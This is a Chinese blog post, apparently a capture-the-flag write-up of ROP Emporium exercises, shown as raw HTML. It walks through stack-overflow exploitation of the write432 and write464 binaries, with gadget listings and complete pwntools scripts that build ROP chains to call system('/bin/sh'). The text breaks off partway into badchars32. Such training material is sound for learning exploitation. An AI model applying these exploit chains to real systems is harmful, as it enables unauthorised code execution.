<!DOCTYPE html>
<html>
  <head><meta name="generator" content="Hexo 3.9.0">
    
    <meta charset="utf-8">
    <meta name="baidu-site-verification" content="vvVgSQUzPU">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="undefined">
     
    <meta name="description" content="null">
    
    <title>
      ROPEmporium-WriteUp - ios&#39;s blog
    </title>
    <link rel="manifest" href="/manifest.json">
    <link rel="shortcut icon" href="undefined" type="image/x-icon">
    <link rel="stylesheet" href="/style/style.css">
  </head>
  <body>
    <div id="fixed-menu">
      <span class="iconfont icon-arrowup"></span>
    </div>
    <div id="progress">
      <div class="line"></div>
    </div>
    <!-- <div id="search-wrap">
      <input type="text" placeholder="Search Keys"/>

      <div class="result"></div>
    </div> -->
    <div id="head">
      
      <a href="/" class="">
        首页
      </a>
      
      <a href="/archives" class="">
        归档
      </a>
      
      <a href="/about" class="">
        关于
      </a>
      
      <a href="/link" class="">
        友情链接
      </a>
      
    </div>
    <div id="container">
      <div id="main">
        <div class="navbar">
          <div class="toggle">
            <span class="iconfont icon-menu toggle-icon"></span>
          </div>
          <div class="search">
            <div class="input-warp">
              <!-- <span class="iconfont icon-sousuo"></span> -->
              <input type="text" name="" class="st-default-search-input" id="site-search" placeholder="Search Keys">
            </div>
          </div>
        </div>
        <div class="content">
          <article class="post-entry">
    <div class="header">
      <div class="title">ROPEmporium-WriteUp</div>
      <div class="meta">
        <span class="item">
          <span class="iconfont icon-time-circle"></span>
          <span>2018/07/12</span>
        </span>

        
        
        

        
          <span class="item leancloud-visitors" id="/2018/07/12/ROPEmporium-WriteUp/" data-flag-title="ROPEmporium-WriteUp">
            <span class="iconfont icon-eye1"></span>
            <span class="leancloud-visitors-count"></span>
          </span>
        
      </div>
      <div>
      </div>
    </div>
    <p>最近在看堆系列 最近的wp都是大家有疑惑 我自己也有点不明白的题目 所以再次记录</p>
<h2 id="write432"><a href="#write432" class="headerlink" title="write432"></a>write432</h2><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ checksec write432
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/write432'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<p>NX 开启</p>
<p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"write4 by ROP Emporium"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"32bits\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nExiting"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>看到main函数中调用了一个pwnme() 猜测漏洞应该在此</p>
<p>跟进查看pwnme</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>

  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Go ahead and give me the string already!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在漏洞</span>
<span class="token punctuation">}</span>
</code></pre>
<p>程序没有提供shell 但是调用了system</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">usefulFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/ls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里调用/bin/ls  但是我们想要的是/bin/sh  所以我们要利用rop想办法构造/bin/sh 并参给system</p>
<p>尝试使用ROPgadget搜索</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary write432 --only <span class="token string">"pop|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x080486db <span class="token keyword">:</span> pop ebp <span class="token punctuation">;</span> ret
0x080486d8 <span class="token keyword">:</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
0x080483e1 <span class="token keyword">:</span> pop ebx <span class="token punctuation">;</span> ret
0x080486da <span class="token keyword">:</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
0x080486d9 <span class="token keyword">:</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> pop ebp <span class="token punctuation">;</span> ret
0x0804819d <span class="token keyword">:</span> ret
0x080484fe <span class="token keyword">:</span> ret 0xeac1

Unique gadgets found: 7
</code></pre>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary write432 --only <span class="token string">"mov|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x08048547 <span class="token keyword">:</span> mov al, byte ptr <span class="token punctuation">[</span>0xc9010804<span class="token punctuation">]</span> <span class="token punctuation">;</span> ret
0x08048670 <span class="token keyword">:</span> mov dword ptr <span class="token punctuation">[</span>edi<span class="token punctuation">]</span>, ebp <span class="token punctuation">;</span> ret
0x080484b0 <span class="token keyword">:</span> mov ebx, dword ptr <span class="token punctuation">[</span>esp<span class="token punctuation">]</span> <span class="token punctuation">;</span> ret
0x0804819d <span class="token keyword">:</span> ret
0x080484fe <span class="token keyword">:</span> ret 0xeac1

Unique gadgets found: 5
ubuntu@ubuntu:~$ 
<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
</code></pre>
<h4 id="ROP构造思路"><a href="#ROP构造思路" class="headerlink" title="ROP构造思路"></a>ROP构造思路</h4><p>先计算偏移 </p>
<pre class=" language-python"><code class="language-python">gef➤  p<span class="token operator">/</span>d <span class="token number">0x28</span><span class="token operator">+</span><span class="token number">4</span>
$<span class="token number">5</span> <span class="token operator">=</span> <span class="token number">44</span>
</code></pre>
<p>得到偏移为44</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">pop_edi_ebp<span class="token operator">=</span><span class="token number">0x080486da</span> <span class="token comment" spellcheck="true"># pop edi ; pop ebp ; ret</span>
mov_ret<span class="token operator">=</span><span class="token number">0x08048670</span> <span class="token comment" spellcheck="true"># mov dword ptr [edi], ebp ; ret</span>
system_plt<span class="token operator">=</span><span class="token number">0x8048430</span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取bss段地址</span>


payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/sh"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
</code></pre>
<p>因为32位寄存器最多只能写4字节，而/bin/sh为7字节 所以我们分两次写入</p>
<p>覆盖偏移到ret + 覆盖ret为pop_edi_ebp+将bss地址写入edi+将/bin写入ebp+将ebp的内容写入bss段</p>
<p>覆盖ret到pop_edi_ebp+将bss+4的地址写入edi(因为bss段前4个地址写入了/bin所以这里为了拼接从bss+4的位置开始写入)+将/sh写入ebp+将ebp的内容写入bss段</p>
<p>覆盖返回地址为system地址+写如system返回地址 可以任意写 +system调用参数的地址 此处存放地址为bss</p>
<h3 id="所以可以得到exp"><a href="#所以可以得到exp" class="headerlink" title="所以可以得到exp"></a>所以可以得到exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'write432'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'write432'</span><span class="token punctuation">)</span>

bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
pop_edi_ebp<span class="token operator">=</span><span class="token number">0x080486da</span>
mov_ret<span class="token operator">=</span><span class="token number">0x08048670</span>
system_plt<span class="token operator">=</span><span class="token number">0x8048430</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/sh\x00"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行</p>
<p><img src="/2018/07/12/ROPEmporium-WriteUp/1.jpg" alt="1"></p>
<h2 id="write464"><a href="#write464" class="headerlink" title="write464"></a>write464</h2><p>题目基本流程和上一道类似</p>
<p>所以这里直接从ROP构造开始讲解</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">gef➤  p<span class="token operator">/</span>d <span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span>
$<span class="token number">2</span> <span class="token operator">=</span> <span class="token number">40</span>
</code></pre>
<p>所以得到偏移为40</p>
<p>尝试用ROPgadget搜索可用的gadget</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary write4 --only <span class="token string">"pop|mov|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x0000000000400713 <span class="token keyword">:</span> mov byte ptr <span class="token punctuation">[</span>rip + 0x20096e<span class="token punctuation">]</span>, 1 <span class="token punctuation">;</span> ret
0x0000000000400821 <span class="token keyword">:</span> mov dword ptr <span class="token punctuation">[</span>rsi<span class="token punctuation">]</span>, edi <span class="token punctuation">;</span> ret
0x00000000004007ae <span class="token keyword">:</span> mov eax, 0 <span class="token punctuation">;</span> pop rbp <span class="token punctuation">;</span> ret
0x0000000000400820 <span class="token keyword">:</span> mov qword ptr <span class="token punctuation">[</span>r14<span class="token punctuation">]</span>, r15 <span class="token punctuation">;</span> ret
0x000000000040088c <span class="token keyword">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040088e <span class="token keyword">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400890 <span class="token keyword">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400892 <span class="token keyword">:</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400712 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> mov byte ptr <span class="token punctuation">[</span>rip + 0x20096e<span class="token punctuation">]</span>, 1 <span class="token punctuation">;</span> ret
0x000000000040088b <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040088f <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004006b0 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret
0x0000000000400893 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret
0x0000000000400891 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040088d <span class="token keyword">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004005b9 <span class="token keyword">:</span> ret

Unique gadgets found: 16
</code></pre>
<p>接下来进行构造</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">pop_r14_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400890</span> <span class="token comment" spellcheck="true"># pop r14 ; pop r15 ; ret</span>
mov_ret <span class="token operator">=</span> <span class="token number">0x0000000000400820</span> <span class="token comment" spellcheck="true"># mov qword ptr [r14], r15 ; ret</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x0000000000400893</span> <span class="token comment" spellcheck="true"># pop rdi ; ret</span>
system_plt <span class="token operator">=</span><span class="token number">0x00000000004005E0</span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取bss段地址</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_r14_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span>
</code></pre>
<p>因为64位下可写入8字节而/bin/sh为7字节所以可以一次写入</p>
<p>覆盖偏移到ret+覆盖ret为pop_r14_r15+将bss地址写入r14+将/bin/sh\x00写入r15+将r15内容写到r14(bss)处</p>
<p>由于64位所以binsh地址参数需要放在rdi寄存器中，覆盖ret为pop_rdi+将bss地址写入rdi+写入system并调用rdi参数</p>
<h3 id="所以可以构造exp"><a href="#所以可以构造exp" class="headerlink" title="所以可以构造exp"></a>所以可以构造exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'write4'</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'write4'</span><span class="token punctuation">)</span>
pop_r14_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400890</span>
mov_ret <span class="token operator">=</span> <span class="token number">0x0000000000400820</span> 
system_plt <span class="token operator">=</span><span class="token number">0x00000000004005E0</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x0000000000400893</span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_r14_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行</p>
<p><img src="/2018/07/12/ROPEmporium-WriteUp/2.jpg" alt="2"></p>
<p>成功获得shell</p>
<h2 id="badchars32"><a href="#badchars32" class="headerlink" title="badchars32"></a>badchars32</h2><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ checksec badchars32
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/badchars32'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<p>NX开启 32位程序</p>
<p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"badchars by ROP Emporium"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"32bits\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nExiting"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>看到main函数调用了pwnme函数 所以我们跟进看下</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">pwnme</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>
  <span class="token keyword">int</span> n<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_4</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-2Ch]</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-28h]</span>

  s <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x200u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>s <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x200u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"badchars are: b i c / &lt;space> f n s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  n <span class="token operator">=</span> <span class="token function">nstrlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">,</span> <span class="token number">0x200u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">checkBadchars</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
